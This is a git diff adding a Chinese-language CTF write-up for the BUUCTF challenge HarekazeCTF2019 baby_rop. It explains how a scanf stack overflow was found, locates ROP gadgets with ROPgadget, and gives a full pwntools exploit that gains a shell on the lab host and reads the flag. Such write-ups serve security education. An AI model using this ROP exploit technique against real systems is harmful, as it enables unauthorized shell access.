@@ -391,6 +391,59 @@ io.interactive()
 
 ------
 
+### [[HarekazeCTF2019]baby_rop](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)
+
+先`file ./HarekazeCTF2019_babyrop1`查看文件类型再`checksec --file=./HarekazeCTF2019_babyrop1`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/1.png) 
+
+用`IDA Pro 64bit`打开附件`HarekazeCTF2019_babyrop1`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`v4`，`v4`的可用栈大小为`0x10`，`scanf()`函数读取输入到`v4`变量时并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/2.png)
+
+双击`v4`变量查看其在当前函数栈帧的详情，构造`payload`时可以用`0x10`个字节占满变量`v4`，再用`0x8`个字节覆盖到栈帧。
+
+![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/3.png)
+
+在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`的地址。
+
+```bash
+ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/4.png)
+
+在`Function window`中存在`system()`函数的地址，我们也可以通过`ELF`模块的`symbols['system']`来获取`system()`函数的地址。字符串`/bin/sh`的地址可以通过`ROPgadget`获取。
+
+```bash
+ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/5.png)
+
+构造`payload`时向`pop_rdi`寄存器中传入字符串`/bin/sh`的地址，再调用`system`即可完成系统调用，编写`Python`代码打通靶机获取到目标主机的`shell`后输入`cat /home/babyrop/flag`即可得到`flag{5113e012-2d92-4257-bf3a-f688df2841bf}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 28730)
+e = ELF('./HarekazeCTF2019_babyrop1')
+# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
+pop_rdi = 0x400683
+system_address = e.symbols['system'] # 0x400490
+# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
+bin_sh_address = 0x601048
+payload = b'a'*0x10 + b'fuckpwn!'
+payload += flat(pop_rdi, bin_sh_address, system_address)
+io.sendlineafter(b'What\'s your name? ', payload)
+io.interactive()  # cat /home/babyrop flag
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/6.png)
+
+------
+
 ### [护网杯_2018_gettingstart](https://buuoj.cn/challenges#%E6%8A%A4%E7%BD%91%E6%9D%AF_2018_gettingstart)
 
 先`file ./2018_gettingstart`查看文件类型再`checksec --file=2018_gettingstart`检查了一下文件保护情况。
